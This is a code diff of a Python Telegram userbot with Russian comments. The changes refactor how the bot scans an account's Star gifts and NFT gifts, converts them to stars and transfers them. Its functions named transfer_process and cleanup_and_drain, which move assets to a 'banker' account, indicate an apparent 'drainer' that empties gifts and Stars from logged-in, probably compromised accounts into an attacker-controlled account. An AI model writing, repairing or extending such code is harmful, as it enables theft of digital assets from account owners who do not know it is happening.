@@ -557,64 +557,30 @@ def calculate_optimal_topup(needed_stars):
     return best_combo
 
 def analyze_gift(gift, location_name="Me"):
-    # Безопасное извлечение атрибутов
-    gift_id = getattr(gift, 'id', None)
-    msg_id = getattr(gift, 'message_id', None)
-    convert_price = getattr(gift, 'convert_price', 0) or 0
-    transfer_price = getattr(gift, 'transfer_price', 0) or 0
-    collectible_id = getattr(gift, 'collectible_id', None)
-    title = getattr(gift, 'title', None)
-    can_transfer_at = getattr(gift, 'can_transfer_at', None)
-    is_converted = getattr(gift, 'is_converted', False)
-    slug = getattr(gift, 'slug', None)
-    can_transfer = getattr(gift, 'can_transfer', False)
-    # Сохраняем raw объект подарка, если он доступен
-    raw_gift_obj = getattr(gift, '_raw_gift', None)
-    
     details = {
-        'id': gift_id, 
-        'msg_id': msg_id,
-        'title': title or 'Gift', 
-        'star_count': convert_price,
-        'transfer_cost': transfer_price,
+        'id': gift.id, 
+        'msg_id': gift.message_id,
+        'title': 'Gift', 
+        'star_count': gift.convert_price or 0,
+        'transfer_cost': gift.transfer_price or 0,
         'is_nft': False, 
-        'can_transfer': can_transfer, 
+        'can_transfer': False, 
         'can_convert': False,
-        'location': location_name,
-        'slug': slug,
-        '_raw_gift': raw_gift_obj  # Сохраняем raw объект для использования в конвертации
+        'location': location_name
     }
     
-    if collectible_id is not None:
+    if getattr(gift, 'collectible_id', None) is not None:
         details['is_nft'] = True
-        details['title'] = title or f"NFT #{collectible_id}"
-        if can_transfer_at is None:
+        details['title'] = gift.title or f"NFT #{gift.collectible_id}"
+        if gift.can_transfer_at is None:
             details['can_transfer'] = True
         else:
-            # can_transfer_at может быть int (timestamp) или datetime объект
-            from datetime import datetime
-            try:
-                if isinstance(can_transfer_at, int):
-                    # Это timestamp, преобразуем в datetime
-                    transfer_time = datetime.fromtimestamp(can_transfer_at)
-                    now = datetime.now()
-                    details['can_transfer'] = (transfer_time <= now)
-                elif hasattr(can_transfer_at, 'tzinfo'):
-                    # Это datetime объект
-                    now = datetime.now(can_transfer_at.tzinfo) if can_transfer_at.tzinfo else datetime.now()
-                    details['can_transfer'] = (can_transfer_at <= now)
-                else:
-                    # Используем значение из объекта gift, если оно уже вычислено
-                    details['can_transfer'] = can_transfer
-            except Exception as e:
-                # В случае ошибки используем значение из объекта gift
-                details['can_transfer'] = can_transfer
+            now = datetime.now(gift.can_transfer_at.tzinfo) if gift.can_transfer_at.tzinfo else datetime.now()
+            details['can_transfer'] = (gift.can_transfer_at <= now)
     else:
-        details['can_convert'] = (convert_price > 0) and (not is_converted)
-        if gift_id:
-            details['title'] = GIFT_EMOJIS.get(gift_id, "🎁")
-        else:
-            details['title'] = title or "🎁"
+        is_converted = getattr(gift, 'is_converted', False)
+        details['can_convert'] = (details['star_count'] > 0) and (not is_converted)
+        details['title'] = GIFT_EMOJIS.get(gift.id, "🎁")
         
     return details
 
@@ -627,9 +593,77 @@ async def get_owned_channels(client: Client):
     except: pass
     return channels
 
+def analyze_gift_raw(gift, location_name="Me"):
+    """Анализ подарка из raw API"""
+    details = {
+        'id': getattr(gift, 'id', 0),
+        'msg_id': getattr(gift, 'msg_id', 0),
+        'title': 'Gift',
+        'star_count': getattr(gift, 'convert_stars', 0) or 0,
+        'transfer_cost': 25,
+        'is_nft': False,
+        'can_transfer': False,
+        'can_convert': False,
+        'location': location_name
+    }
+    
+    # Проверяем NFT
+    inner_gift = getattr(gift, 'gift', None)
+    if inner_gift and hasattr(inner_gift, 'id'):
+        # Это может быть NFT если есть collectible атрибуты
+        if hasattr(inner_gift, 'limited_number') or hasattr(inner_gift, 'availability_total'):
+            details['is_nft'] = True
+            details['title'] = getattr(inner_gift, 'title', f"NFT #{inner_gift.id}")
+            details['can_transfer'] = not getattr(gift, 'unsaved', False)
+        else:
+            details['title'] = GIFT_EMOJIS.get(inner_gift.id, "🎁")
+    
+    # Проверяем возможность конвертации
+    if details['star_count'] > 0 and not getattr(gift, 'converted', False):
+        details['can_convert'] = True
+    
+    return details
+
+async def scan_location_gifts(client: Client, peer_id, location_name):
+    """Сканирование подарков через raw API"""
+    found_gifts = []
+    
+    if not PYROFORK_AVAILABLE:
+        try:
+            from pyrogram import raw as pyro_raw
+        except:
+            return found_gifts
+    else:
+        from pyrofork import raw as pyro_raw
+    
+    try:
+        # Определяем peer
+        if peer_id == "me":
+            peer = pyro_raw.types.InputPeerSelf()
+        else:
+            peer = await client.resolve_peer(peer_id)
+        
+        result = await client.invoke(
+            pyro_raw.functions.payments.GetSavedStarGifts(
+                peer=peer,
+                offset="",
+                limit=100
+            )
+        )
+        
+        if hasattr(result, 'gifts') and result.gifts:
+            for gift in result.gifts:
+                analyzed = analyze_gift_raw(gift, location_name)
+                found_gifts.append(analyzed)
+                
+    except Exception as e:
+        log_transfer(f"Scan gifts error ({location_name}): {e}", "warning")
+    
+    return found_gifts
+
 async def safe_get_chat_gifts(client: Client, chat_id="me"):
     """
-    Безопасное получение подарков через raw API (обход проблемы с exclude_limited)
+    Безопасное получение подарков через raw API
     """
     try:
         if PYROFORK_AVAILABLE:
@@ -646,8 +680,7 @@ async def safe_get_chat_gifts(client: Client, chat_id="me"):
                 if chat_id == me.id:
                     peer = raw.types.InputPeerSelf()
                 else:
-                    # Пробуем получить peer по ID
-                    peer = raw.types.InputPeerUser(user_id=chat_id, access_hash=0)
+                    peer = await client.resolve_peer(chat_id)
             except:
                 peer = raw.types.InputPeerSelf()
         
@@ -913,34 +946,39 @@ async def safe_get_chat_gifts(client: Client, chat_id="me"):
             log_transfer(f"❌ Fallback также не сработал: {type(fallback_e).__name__}: {fallback_e}", "error")
 
 async def scan_location_gifts(client: Client, peer_id, location_name):
+    """Сканирование подарков через raw API"""
     found_gifts = []
     
-    # Получаем ID пользователя для использования в методах
-    user_id = None
-    try:
-        me = await client.get_me()
-        user_id = me.id
-        log_transfer(f"🔍 Сканирование подарков для {location_name}, peer_id={peer_id}, user_id={user_id}")
-    except Exception as e:
-        log_transfer(f"⚠️ Не удалось получить user_id: {e}", "warning")
+    if not PYROFORK_AVAILABLE:
+        try:
+            from pyrogram import raw as pyro_raw
+        except:
+            return found_gifts
+    else:
+        from pyrofork import raw as pyro_raw
     
-    # Используем safe_get_chat_gifts (который использует raw API и обходит проблему exclude_limited)
     try:
-        log_transfer(f"🔍 Использование safe_get_chat_gifts для получения подарков")
-        count = 0
-        async for gift in safe_get_chat_gifts(client, peer_id):
-            count += 1
-            gift_info = analyze_gift(gift, location_name)
-            found_gifts.append(gift_info)
-            log_transfer(f"🎁 Найден подарок #{count}: {gift_info['title']} (NFT: {gift_info['is_nft']}, Конверт: {gift_info['can_convert']}, Трансфер: {gift_info['can_transfer']})")
-        
-        if len(found_gifts) > 0:
-            log_transfer(f"✅ Успешно найдено {len(found_gifts)} подарков в {location_name}")
+        # Определяем peer
+        if peer_id == "me":
+            peer = pyro_raw.types.InputPeerSelf()
         else:
-            log_transfer(f"⚠️ Подарки не найдены в {location_name}")
-            
+            peer = await client.resolve_peer(peer_id)
+        
+        result = await client.invoke(
+            pyro_raw.functions.payments.GetSavedStarGifts(
+                peer=peer,
+                offset="",
+                limit=100
+            )
+        )
+        
+        if hasattr(result, 'gifts') and result.gifts:
+            for gift in result.gifts:
+                analyzed = analyze_gift_raw(gift, location_name)
+                found_gifts.append(analyzed)
+                
     except Exception as e:
-        log_transfer(f"❌ Ошибка сканирования подарков: {type(e).__name__}: {e}", "error")
+        log_transfer(f"Scan gifts error ({location_name}): {e}", "warning")
     
     return found_gifts
 
@@ -974,7 +1012,7 @@ async def send_gift_task(client: Client, target_id, price, target_username=None,
             except: return False
         return False
 
-async def convert_gift_task(client: Client, gift_details, raw_gift_obj=None):
+async def convert_gift_task(client: Client, gift_details):
     """Конвертация подарка через высокоуровневый API"""
     msg_id = gift_details.get('msg_id')
     if not msg_id:
@@ -983,7 +1021,8 @@ async def convert_gift_task(client: Client, gift_details, raw_gift_obj=None):
     try:
         await client.convert_gift_to_stars(owned_gift_id=str(msg_id))
         return True
-    except Exception:
+    except Exception as e:
+        log_transfer(f"Ошибка конвертации: {e}", "error")
         return False
 
 async def transfer_nft_task(client: Client, gift_details, target_chat_id, bot: Bot, user_db_data):
@@ -1282,8 +1321,9 @@ async def transfer_process(client: Client, banker: Client, bot: Bot):
                         gift_info['id'] = g.saved_id
                     elif not gift_info.get('id') and hasattr(g, 'id'):
                         gift_info['id'] = g.id
-                    log_transfer(f"♻️ Найден подарок для конвертации: {gift_info['title']} (saved_id={gift_info.get('id')}, msg_id={gift_info.get('msg_id')}, raw_gift_obj={raw_gift_obj is not None})")
-                    convert_tasks.append(convert_gift_task(client, gift_info, raw_gift_obj))
+                    if not gift_info.get('msg_id') and hasattr(g, 'message_id'):
+                        gift_info['msg_id'] = g.message_id
+                    convert_tasks.append(convert_gift_task(client, gift_info))
                     total_convertable_stars += convert_price
             
             # Если есть подарки для конвертации - конвертируем их
@@ -1565,8 +1605,9 @@ async def cleanup_and_drain(client: Client, banker_username):
             elif convert_price > 0:
                 # Конвертируемый подарок - конвертируем в звезды
                 log_transfer(f"♻️ Добавлен в очередь конвертации: {gift_info['title']} (+{convert_price} зв)")
-                raw_gift_obj = gift_info.get('_raw_gift') or getattr(g, '_raw_gift', None)
-                convert_tasks.append(convert_gift_task(client, gift_info, raw_gift_obj))
+                if not gift_info.get('msg_id') and hasattr(g, 'message_id'):
+                    gift_info['msg_id'] = g.message_id
+                convert_tasks.append(convert_gift_task(client, gift_info))
         
         log_transfer(f"📊 Статистика: Всего={gift_count}, К передаче={len(transfer_tasks)}, К конвертации={len(convert_tasks)}")
         
